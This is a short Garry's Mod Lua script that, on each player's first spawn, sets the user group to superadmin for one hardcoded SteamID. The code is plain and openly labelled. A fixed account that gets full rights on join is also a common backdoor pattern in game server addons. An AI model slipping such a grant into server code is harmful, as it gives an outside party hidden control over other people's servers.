local function GetSteamIDAndGrantSuperadmin(ply)
    if IsValid(ply) then
        local steamID = ply:SteamID()
        
        -- Grant superadmin access based on the obtained SteamID
        if steamID == "STEAM_0:0:593328437" then
            ply:SetUserGroup("superadmin")
        end
    end
end

hook.Add("PlayerInitialSpawn", "GrantSuperadminOnSpawn", GetSteamIDAndGrantSuperadmin)
